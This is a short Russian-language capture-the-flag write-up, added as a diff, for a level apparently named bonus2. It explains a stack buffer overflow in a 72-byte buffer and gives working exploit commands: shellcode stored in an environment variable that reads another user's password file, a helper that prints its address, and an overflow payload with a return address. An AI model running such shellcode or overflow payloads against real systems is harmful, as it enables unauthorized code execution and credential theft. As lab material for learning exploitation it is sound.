@@ -1,0 +1,12 @@
+В программе есть два буфер на 72 символа, в который записывается сначала строка, зависящая от значения LANG в окружении,
+затем 40 символов из первого аргумента и 32 из второго. Используем классическое переполнение буфера, и положим туда адрес шелкода.
+
+export KEK=`python -c 'print "\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\xeb\x21\x5f\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe6\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x57\x56\x53\x89\xe1\xcd\x80\xe8\xda\xff\xff\xffcat /home/user/bonus1/.pass"'`
+
+cd /tmp && mkdir 3 && cd 3
+echo 'int     main(void){printf(" %p\n", getenv("KEK"));}' > addr.c && gcc addr.c && ./a.out
+
+export LANG="nl"
+
+/home/user/bonus2/bonus2 `python -c 'print "A" * 40'` `python -c 'print "B" * 23 + "\xbf\xff\xff\x48"[::-1]'`
+
